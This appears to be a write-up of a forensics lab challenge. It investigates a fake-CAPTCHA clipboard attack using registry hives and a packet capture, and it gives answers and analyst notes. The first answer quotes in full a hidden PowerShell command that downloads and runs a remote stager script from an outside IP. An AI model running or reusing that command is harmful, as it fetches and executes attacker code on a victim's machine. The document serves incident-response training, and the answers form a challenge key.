# Questions
- It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.
	- powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
- At what time in UTC did the malicious payload execute?
	- 2024-09-23 05:07:45
- The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?
	- 579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE
- To which port did the reverse shell connect?
	- 6969
- For how many seconds was the reverse shell connection established between C2 and the victim's workstation?
	- 403
- Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim's clipboard?
	- stageClipboard


# Notes
- When unzipping the file, we get a .pcapng file, so we can use Wireshark to view this file
- However, we are also given simlilar file system and log files to the previous challenge
- To answer the first question, we need to dive into that specific user folder, which would be happy.grunwald
- We are given two different logs file within the folder, which we can view using the Registry Explorer tool
- We can then grab the entry in which we have the full command that was used
- Next, we need to find the timestamp, which is provided within the same entry
- Now, we focus on this specific script that was used. Specifically, let's attempt to recover the SHA256 hash of the script.
- For this, we will fire up Wireshark and open up the .pcapng file
- After filtering down the results, we see the usage of a suspicious office2024install Powershell script
- We can then export out the file, and save a copy of the script onto our computer.
- We can then use the get-filehash to get the hash of the script.
- Next, we need to find the port that was used by the script
- We can find this by looking into the script itself, where we are able to pull out the usage of the port 6969 (double nice)
- We also are able to confirm this by looking at the TCP traffic through Wireshark
- Next, we need to find out how long the connection between the C2 and the victim lasted
- We can also find this information within the pcapng file
- After grabbing that timestamp, we are then able to convert it into seconds, which gets us 403 seconds
- Lastly, we need the name of the function that has the payload in it.
- Looking through the data, we can see a HTTP request, in which we are able to see the usage of the function called stageClipboard.